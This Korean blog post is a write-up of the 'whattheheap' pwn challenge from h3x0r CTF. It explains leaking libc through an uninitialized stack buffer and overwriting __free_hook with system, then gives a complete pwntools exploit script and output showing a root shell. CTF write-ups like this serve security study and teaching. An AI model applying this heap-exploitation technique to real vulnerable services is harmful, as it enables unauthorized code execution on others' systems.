---
layout: post
title: ! '[h3x0r CTF] whattheheap (pwn 420)'
excerpt_separator: <!--more-->
comments: true
tags:
  - CTF
  - Write-up
---

H3x0r CTF가 끝난 후에도 사이트가 열려있어서 덕분에 공부를 많이 하고 있다. pwnable 문제 중 두번째로 낮은 점수를 가지고 있었던 whattheheap 문제를 풀어보았다.

<!--more-->

> nc 49.236.136.140 16000
> 
> nc c2w2m2.com 16000
> 
> [Download](https://h3x0r.kr/uploads/10/whattheheap)
> 
>
> -초록돼지

역시 바이너리를 하나 던져준다.

> root@ubuntu:~/CTF/h3x0r/whattheheap# checksec whattheheap
>
> [*] '/root/CTF/h3x0r/whattheheap/whattheheap'
>
> Arch:     amd64-64-little
>
> RELRO:    Full RELRO
>
> Stack:    Canary found
>
> NX:       NX enabled
>
> PIE:      PIE enabled

Full RELRO, Stack Canary, NX bit, PIE 보호기법이 모두 걸려있다. 이에 주의하면서 문제를 풀어야 한다.

먼저 PIE 보호기법때문에 분석이 어렵다. 이를 우회하는 방법은 [revers3r님의 블로그](http://revers3r.tistory.com/368)를 참고하였다.

![]({{ site.baseurl }}/images/KRater/2018-07-02-whattheheap-writeup/pic01.PNG)

위에 나온 트릭으로 main 함수의 주소를 구할 수 있다. 또한 이를 이용해서 베이스 주소를 구한 뒤, 오프셋을 이용해서 다른 함수들 주소까지도 구할 수 있다. 이렇게 함수 주소를 구해놓은 뒤, 브레이크 포인트 걸 때 참고하면 분석하는게 훨씬 쉬워진다. 오프셋 구하는건 IDA에 아주 잘 나와있으니 참고하면 좋다.

name이 스택 영역 (지역변수)에 있다. 그런데 초기화가 되있지 않아서 많은 주소를 leak할 수 있다. 처음에는 이를 응용해서 함수 주소를 leak한 뒤, got overwrite를 해 보려고 했는데 Full RELRO가 있다는걸 까먹었다.. 그래서 삽질하다가 안된다는걸 깨닫고 다른 방법을 찾았다.

역시 name이 초기화되지 않았다는것을 응용, libc 주소를 leak한다. 임의의 주소에 값을 어떻게 쓸 지 고민하면서 계속 분석하고 있었는데, 마침 좋은 벡터를 찾았다.

![]({{ site.baseurl }}/images/KRater/2018-07-02-whattheheap-writeup/pic02.PNG)

$rbp-0x110은 name이 들어가는 위치이고, $rbp-0x118은 다른 함수들에 인자로 넘겨주는 값이다. (add, delete, edit, print) 그런데 $rbp-0x118에서부터 8*index 만큼 떨어진 위치에 해당 index의 heap 공간을 저장한다. 이렇게 되면 자연스럽게 두 번째 할당된 heap 영역의 주소가 name의 공간을 침범하게 된다. name 공간에 임의의 주소를 작성하고, 이에 해당하는 index의 값을 바꾸면(edit) 임의의 주소 안의 값을 조작할 수 있다.

Full RELRO 우회를 위해 free_hook에 system의 주소를 쓰고, free("/bin/sh")을 system("/bin/sh")로 조작할 것이다. 이를 위해 0번째 index에는 /bin/sh를 써 두고, 이를 delete하도록 한다.

```python
from pwn import *

PROCESS = "./whattheheap"
r = process(PROCESS)

def main () :
	r.send ("name")

	r.recvuntil("> ")
	r.sendline("5")
	r.recvuntil("change.")
	r.send("A"*0x28)

	r.recvuntil("> ")
	r.sendline("6")
	r.recvuntil("A"*0x28)
	data = r.recv(6) + "\x00\x00"

	log.warn("length of data : " + str(len(data)))

	libc_base = u64(data)-0x18c627
	free_hook_addr = libc_base+0x3C67A8
	system_addr = libc_base+0x45390

	log.info("libc_base : " + hex(libc_base))
	log.info("free_hook_addr : " + hex(free_hook_addr))
	log.info("system_addr : " + hex(system_addr))

	add(10, '/bin/sh\x00')
	add(10, 'C'*4)
	add(128, 'D'*120)
	add(128, 'E'*120)

	rename(p64(free_hook_addr))

	edit(1, p64(system_addr))
	delete(0) # trigger system("/bin/sh")

	r.interactive()

def add (size, content) :
	r.recvuntil("> ")
	r.sendline("1")

	r.recvuntil("size : ")
	r.sendline(str(size))
	r.recvuntil("contents : ")
	r.send(content)

def delete (index) :
	r.recvuntil("> ")
	r.sendline("2")

	r.recvuntil("> ")
	r.sendline(str(index))

def edit (index, content) :
	r.recvuntil(">")
	r.sendline("3")

	r.recvuntil(">")
	r.sendline(str(index))
	r.recvuntil("contents : ")
	r.send(content)

def rename (name) :
	r.recvuntil(">")
	r.sendline("5")
	r.recvuntil("to change.")
	r.send(name)

if __name__ == '__main__' :
	main()

```

>root@ubuntu:~/CTF/h3x0r/whattheheap# python ex.py 
>
>[+] Starting local process './whattheheap': pid 48592
>
>[!] length of data : 8
>
>[*] libc_base : 0x7facf1936000
>
>[*] free_hook_addr : 0x7facf1cfc7a8
>
>[*] system_addr : 0x7facf197b390
>
>[*] Switching to interactive mode
>
>$ ls
>
>ex.py  peda-session-whattheheap.txt  sol.py  test.py  whattheheap
>
>$ id
>
>uid=0(root) gid=0(root) groups=0(root)

재밌었다!